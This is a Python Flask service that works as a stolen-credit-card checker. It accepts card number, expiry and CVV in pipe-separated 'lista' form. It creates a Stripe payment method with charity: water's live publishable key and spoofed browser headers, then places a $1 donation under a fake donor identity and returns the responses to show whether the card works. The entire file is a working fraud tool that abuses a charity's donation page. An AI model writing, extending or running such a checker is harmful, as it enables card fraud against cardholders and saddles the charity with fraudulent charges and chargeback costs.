from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    # Get card details from request
    lista = request.values.get('lista')
    if not lista:
        return jsonify({"error": 'Missing "lista" parameter'}), 400
    parts = lista.split('|')
    if len(parts) < 4:
        return jsonify({"error": '"lista" parameter must have 4 values separated by "|"'}), 400
    cc, mm, yy, cvv = [x.strip() for x in parts[:4]]

    # Stripe request
    stripe_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    }
    stripe_data = (
        f"type=card"
        f"&billing_details[address][postal_code]=10002"
        f"&billing_details[address][city]=NY"
        f"&billing_details[address][country]=US"
        f"&billing_details[address][line1]=mera+ghar"
        f"&billing_details[email]=bentexpapa%40volku.org"
        f"&billing_details[name]=Skittle+ganda"
        f"&card[number]={cc}"
        f"&card[cvc]={cvv}"
        f"&card[exp_month]={mm}"
        f"&card[exp_year]={yy}"
        f"&guid=d94c27d9-c29d-44bf-9765-f86a81c79b60b142cd"
        f"&muid=173a3da0-ca24-4e42-affb-cc6b4ae48f6e29223e"
        f"&sid=fb0aae81-654b-4e23-a016-f87b2961e54bedd498"
        f"&pasted_fields=number"
        f"&payment_user_agent=stripe.js%2F16ce65ed9f%3B+stripe-js-v3%2F16ce65ed9f%3B+card-element"
        f"&referrer=https%3A%2F%2Fwww.charitywater.org"
        f"&time_on_page=124580"
        f"&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
    )
    stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
    stripe_json = stripe_response.json()

    if "error" in stripe_json:
        return jsonify({"stripe_error": stripe_json["error"]})

    payment_method_id = stripe_json.get('id')
    if not payment_method_id:
        return jsonify({"error": "No payment method ID returned, aborting."})

    # CharityWater request
    charity_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.charitywater.org',
        'referer': 'https://www.charitywater.org/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    }
    charity_data = {
        'country': 'us',
        'payment_intent[email]': 'bentexpapa@volku.org',
        'payment_intent[amount]': '1',
        'payment_intent[currency]': 'usd',
        'payment_intent[payment_method]': payment_method_id,
        'disable_existing_subscription_check': 'false',
        'donation_form[amount]': '1',
        'donation_form[comment]': '',
        'donation_form[display_name]': '',
        'donation_form[email]': 'bentexpapa@volku.org',
        'donation_form[name]': 'Skittle',
        'donation_form[payment_gateway_token]': '',
        'donation_form[payment_monthly_subscription]': 'false',
        'donation_form[surname]': 'ganda',
        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[setup_intent_id]': '',
        'donation_form[subscription_period]': '',
        'donation_form[metadata][email_consent_granted]': 'false',
        'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
        'donation_form[metadata][phone_number]': '',
        'donation_form[metadata][plaid_account_id]': '',
        'donation_form[metadata][plaid_public_token]': '',
        'donation_form[metadata][uk_eu_ip]': 'false',
        'donation_form[metadata][url_params][touch_type]': '1',
        'donation_form[metadata][session_url_params][touch_type]': '1',
        'donation_form[metadata][with_saved_payment]': 'false',
        'donation_form[address][address_line_1]': 'mera ghar',
        'donation_form[address][address_line_2]': '',
        'donation_form[address][city]': 'NY',
        'donation_form[address][country]': '',
        'donation_form[address][zip]': '10002',
    }
    charity_response = requests.post('https://www.charitywater.org/donate/stripe', headers=charity_headers, data=charity_data)
    try:
        charity_json = charity_response.json()
    except Exception:
        charity_json = charity_response.text

    return jsonify({
        "stripe_response": stripe_json,
        "charitywater_response": charity_json
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)